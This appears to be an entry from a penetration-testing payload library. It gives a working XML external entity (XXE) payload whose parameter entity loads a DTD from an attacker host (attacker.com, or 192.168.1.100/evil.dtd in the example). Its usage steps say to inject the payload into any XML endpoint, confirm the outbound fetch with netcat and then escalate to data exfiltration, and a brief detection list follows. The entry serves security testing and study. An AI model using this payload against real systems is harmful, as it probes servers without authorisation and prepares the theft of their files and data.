---
type: code
language: xml
verified: true
created_at: '2024-01-01T00:00:00Z'
updated_at: '2024-01-01T00:00:00Z'
tags:
  - xxe
  - payload
  - external-entity
platforms:
  - Web
validated: true
---

# XXE-External-DTD-Reference-Payload

## Code

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
    %ext;
]>
<message></message>
```

## Description

This XML payload defines a parameter entity (%ext) that references an external DTD file hosted on an attacker-controlled server. When processed by a vulnerable XML parser, it attempts to load the DTD, confirming XXE vulnerability and potentially allowing further payload injection via the external file.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| http://attacker.com/ext.dtd | URL to attacker-hosted DTD file containing additional malicious entities | http://192.168.1.100/evil.dtd |

## Usage

Inject this payload into any XML-accepting endpoint (e.g., via POST data in a web form or API). Use it as an initial test to verify if the parser resolves external entities. If the server fetches the DTD (monitor with netcat or access logs), proceed to more advanced payloads for data exfiltration.

## Detection

- Network traffic to unexpected external domains from the application server.
- XML parsing logs showing entity expansion attempts.
- WAF alerts on DOCTYPE declarations in input.

## Related

- [[procedures/Error-Based-XXE-Injection-Attack]]
